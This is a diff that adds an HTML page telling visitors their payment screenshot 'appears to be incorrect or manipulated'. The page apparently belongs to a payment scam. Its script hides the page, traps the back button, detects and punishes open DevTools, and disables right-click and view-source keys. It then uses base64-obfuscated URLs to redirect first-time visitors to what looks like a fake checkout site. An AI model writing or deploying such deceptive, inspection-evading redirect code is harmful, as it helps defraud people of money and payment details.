@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Mistaken</title>
+  <style>
+    html { display: none; }
+  </style>
+
+  <script>
+    // Prevent back button navigation
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => history.go(1);
+
+    // Basic dev tools detection (timing trick)
+    const devtoolsDetector = setInterval(() => {
+      const start = new Date();
+      debugger;
+      if (new Date() - start > 100) {
+        document.body.innerHTML = '<h1>DevTools are open. Access denied.</h1>';
+        clearInterval(devtoolsDetector);
+      }
+    }, 1000);
+
+    // Disable right-click and key shortcuts
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (
+        e.key === 'F12' ||
+        (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
+        (e.ctrlKey && e.key === 'U')
+      ) {
+        return false;
+      }
+    };
+
+    // Obfuscated-style redirect logic
+    (function() {
+      const key = 'visitCount';
+      let count = localStorage.getItem(key);
+      count = count ? +count : 0;
+      localStorage.setItem(key, ++count);
+
+      const redirects = [
+        'aHR0cHM6Ly9oaW1hbnBheW1lbnQyY2hlY2tvdXQucGFnZXMuZGV2L09yZGVySUQ9OTE5Mk1ldGhvZD1Db25maXJtYXRpb24=',
+        'aHR0cHM6Ly9oaW1hbnBheW1lbnQyY2hlY2tvdXQucGFnZXMuZGV2L09yZGVySUQ9OTE5Mk1ldGhvZD1Db25maXJtYXRpb25z',
+        'aHR0cHM6Ly9oaW1hbnBheW1lbnQyY2hlY2tvdXQucGFnZXMuZGV2L09yZGVySUQ9OTE5Mk1ldGhvZD1Db25maXJtYXRpb25zcw=='
+      ];
+
+      if (count >= 1 && count <= redirects.length) {
+        const url = atob(redirects[count - 1]);
+        location.replace(url);
+      } else {
+        document.documentElement.style.display = 'block';
+      }
+    })();
+  </script>
+</head>
+<body>
+    <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body, html {
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background-color: #f8f9fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .message-box {
+      background-color: #fff;
+      padding: 30px 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+
+    .message-box h1 {
+      font-size: 1.5rem;
+      color: #dc3545;
+    }
+
+    @media (max-width: 480px) {
+      .message-box h1 {
+        font-size: 1.2rem;
+      }
+    }
+  </style>
+   <div class="message-box">
+    <h1>Apologies, but the payment screenshot you submitted appears to be incorrect or manipulated</h1>
+  </div>
+</body>
+</html>
